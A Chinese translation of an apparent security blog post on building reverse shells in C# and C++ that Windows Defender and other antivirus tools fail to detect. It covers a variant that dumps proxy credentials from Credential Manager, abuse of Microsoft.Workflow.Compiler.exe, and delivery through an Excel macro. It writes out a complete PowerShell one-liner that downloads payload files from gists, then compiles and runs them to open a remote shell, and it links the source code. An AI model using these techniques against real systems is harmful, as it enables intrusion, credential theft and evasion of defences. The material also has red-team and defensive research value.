**严正声明：本文仅用于教育和技术讨论目的，严禁用于非法用途。**

## 前言

**在去年底的时候，我曾写过一篇关于直接在内存中执行PowerShell脚本获取反向shell的文章。当时，这些脚本几乎躲过了所有主流AV的检测。直到我向他们报告后，他们才开始发现此类攻击行为。当然，如今大多数的AV都已能够检测到它们。**

但这让我又萌生了另外一个新的想法，就是如果将PowerShell换成C++/C#程序或是其它的，又会发生什么呢？带着这个疑问，让我们来动手试试看。

## 使用C#编写简单的反向shell

在github上，我看到了许多可以通过cmd.exe打开反向shell的简单C#代码。为了节约时间，我直接复制了其中一个的部分代码。这是一段非常简洁的代码，其功能只有一个就是“打开socket并在受害者机器上启动cmd.exe”（不具备任何的持久性，绕过或隐藏代码）：

![使用C#编写简单的反向shell](https://image.3001.net/images/20181122/1542852716_5bf6106c6e2f0.png!small)

源码链接：<https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc>。

![使用C#编写简单的反向shell](https://image.3001.net/images/20181122/1542852737_5bf61081aefe5.png!small)

我在Kali上使用netcat侦听443端口，编译并执行我的代码。

![使用C#编写简单的反向shell](https://image.3001.net/images/20181122/1542852768_5bf610a0e0780.png!small)

正如你所看到的，.exe文件是干净的Windows Defender没有检测到任何威胁。

![使用C#编写简单的反向shell](https://image.3001.net/images/20181122/1542852787_5bf610b3861df.png!small)

执行文件cmd实例对用户可见，如果提示窗口将被关闭，则shell将发生相同的情况。

![使用C#编写简单的反向shell](https://image.3001.net/images/20181122/1542852804_5bf610c4563d9.png!small)

运行exe文件我的Kali将会立马获取到一个反向shell。

### VIRUS TOTAL 结果

![VIRUS TOTAL
结果](https://image.3001.net/images/20181122/1542852820_5bf610d492229.png!small)

>
> <https://www.virustotal.com/#/file/983fe1c7d4cb293d072fcf11f8048058c458a928cbb9169c149b721082cf70aa/detection>

## 使用C++编写的反向shell（具备一定的持久性）

下面的C++代码是[@NinjaParanoid](https://twitter.com/NinjaParanoid)编写的，这段代码的优势就是让反向shell有了一定的持久性。以下是代码的一些细节描述，有关详细信息请转到[原文](https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/)查看。

该脚本主要做了以下3点改进：

> while循环尝试在5秒后重连；
>
> 隐藏cmd实例；
>
> 如果标准攻击者ip改变则接受参数。

![使用C++编写的反向shell（具备一定的持久性）](https://image.3001.net/images/20181122/1542852844_5bf610ec321a5.png!small)

![使用C++编写的反向shell（具备一定的持久性）](https://image.3001.net/images/20181122/1542852875_5bf6110b9fb98.png!small)

![使用C++编写的反向shell（具备一定的持久性）](https://image.3001.net/images/20181122/1542852876_5bf6110c9429c.png!small)

编译代码后，我使用Windows
Defender对其进行了分析，同样未检测到任何威胁。此时，exe行为开始处在恶意和非恶意之间。运行该文件shell将在“静默模式”下5秒后打开。

![使用C++编写的反向shell（具备一定的持久性）](https://image.3001.net/images/20181122/1542852904_5bf61128437bf.png!small)

现在，用户端的屏幕上将不会显示任何内容。如果当中出现问题，后台进程将每5秒自动重连Kali一次。

![使用C++编写的反向shell（具备一定的持久性）](https://image.3001.net/images/20181122/1542852925_5bf6113d96800.png!small)

### VIRUS TOTAL 结果

![](https://image.3001.net/images/20181122/1542852944_5bf611507a2bf.png!small)

>
> <https://www.virustotal.com/#/file/a7592a117d2ebc07b0065a6a9cd8fb186f7374fae5806a24b5bcccd665a0dc07/detection>

## 通过互联网使用代理凭证打开C#反向shell

为了验证我的这个想法，我专门为此编写了以下代码：

> 结合[peewpw](https://github.com/peewpw/Invoke-WCMDump)脚本从Credential
> Manager转储代理凭据（如果存在），没有管理员权限；
>
> 在Base64中编码转储的凭据；
>
> 将它们插入代理授权连接。

......就是这样......

![通过互联网使用代理凭证打开C#反向shell](https://image.3001.net/images/20181122/1542852973_5bf6116d1a2c6.png!small)

![通过互联网使用代理凭证打开C#反向shell](https://image.3001.net/images/20181122/1542852973_5bf6116d4f8a3.png!small)

...在编译代码之前，你只需要目标公司的代理IP/端口。出于安全原因，我无法共享源码以避免在野的利用，但如果你懂编程你或许可以自己写出来。但遗憾的是，该攻击的失败率非常高，因为受害者可能没有在凭据管理器上保存域凭据，这样一来攻击将失效。

此外，在这种情况下，Windows Defender和其他企业AV解决方案也未检测到任何威胁。

感谢[@SocketReve](https://twitter.com/SocketReve)帮助我编写此代码。

使用Microsoft.Workflow.Compiler.exe通过C#实时编译打开反向shell

通过深入查找，我发现了一些讨论关于利用Microsoft.Workflow.Comiler.exe执行未签名任意代码的文章。

> <https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-> microsoft-workflow-compiler-exe-3d9294bc5efb>
>
> <https://www.forcepoint.com/blog/security-labs/using-c-post-powershell-> attacks>
>
> [www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-> strike/](http://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-> veil-and-cobalt-strike/)

这些文章让我再次思考，何不利用这种技术来打开用C#编写的反向shell呢？

简而言之，文章讨论了如何滥用Microsoft.Workflow.Compiler.exe服务实时编译C#代码。以下是一个命令示例：

![令示例](https://image.3001.net/images/20181122/1542853029_5bf611a5d93fc.png!small)

REV.txt文件必须具有以下XOML结构：

![XOML结构](https://image.3001.net/images/20181122/1542853054_5bf611bec070c.png!small)

以下是将要被编译的C#代码的RAW结构（与上述C#反向shell代码相同）：

![与上述C#反向shell代码相同](https://image.3001.net/images/20181122/1542853074_5bf611d25e445.png!small)

运行该命令后：

> 非无文件：C#源码是从Rev.Shell文件中获取的。
>
> 无文件：编译和执行C# payload。
>
> 无文件：payload打开反向shell。

![运行该命令后](https://image.3001.net/images/20181122/1542853097_5bf611e9cec24.png!small)

![运行该命令后](https://image.3001.net/images/20181122/1542853110_5bf611f6524e5.png!small)

通过PowerShell和C#实时编译打开反向Shell

现在，我的想法是如何将这种攻击用于红队或真正的攻击当中？

其实这很简单，我们可以PowerShell编译Microsoft.Workflow.Compiler.exe。

    
    
    powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

![](https://image.3001.net/images/20181122/1542853134_5bf6120e00111.png!small)

执行该命令，PS将下载上述两个文件并将其保存在文件系统中。然后它会滥用Microsoft.Workflow.Compiler.exe来编译C#实时代码并打开反向shell。

> PowerShell
> 命令：<https://gist.githubusercontent.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f/raw/7806b5c9642bdf39365c679addb28b6d19f31d76/PowerShell_Command.txt>

[REV.txt
代码](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066) —
[Rev.Shell
](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)[代码](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

一旦PS启动反向shell将被打开，并且没有任何的检测告警。

![没有任何的检测告警](https://image.3001.net/images/20181122/1542853152_5bf612206d0d8.png!small)

## 通过Excel宏，PowerShell和C#实时编译打开反向Shell

作为本文的最后部分内容，我打算尝试在宏中插入刚刚的Powershell代码......猜猜发生了什么？

该文件未被检测为恶意文件，并且在没有任何警报的情况下打开了反向shell。

![反向Shell](https://image.3001.net/images/20181122/1542853181_5bf6123d28a9b.png!small)

![反向Shell](https://image.3001.net/images/20181122/1542853202_5bf6125202bff.png!small)

![反向Shell](https://image.3001.net/images/20181122/1542853203_5bf6125337ab8.png!small)

### VIRUS TOTAL 结果

![VIRUS TOTAL
结果](https://image.3001.net/images/20181122/1542853219_5bf612635df1e.png!small)

>
> <https://www.virustotal.com/#/file/e81fe80f61a276d216c726e34ab0defc6e11fa6c333c87ec5c260f0018de89b4/detection>

许多检测都只关注启动PowerShell的宏，而不是实际的行为。这意味着如果攻击者能够对代码进行混淆处理或使用其他服务来下载这两个文件，则可以逃避检测并打开反向shell，如上所示。

## 总结

通过本文的几个例子可以看出，市面上大多数的AV对于处在恶意与非恶意之间的行为难以辨别检测。前两个shell，几乎让所有的AV全军覆没。与恶意宏相关的签名只关注通用PowerShell，而不是真正的滥用微软服务。

使用Microsoft.Workflow.Compiler.exe的任意代码执行技术，仅依赖于调用命令的能力而不是PowerShell本身。攻击者无需使用可能由安全解决方案检测和阻止的某些已知PowerShell技术。这样的好处是例如你可以绕过应用程序白名单以及获取一种新的混淆恶意行为的方法等。也就是说，当滥用Microsoft.Workflow.Compiler.exe时，将会创建一个临时的DLL并可能被AV检测到。

 ***参考来源：[medium](https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15)，FB小编secist编译，转载请注明来自FreeBuf.COM**

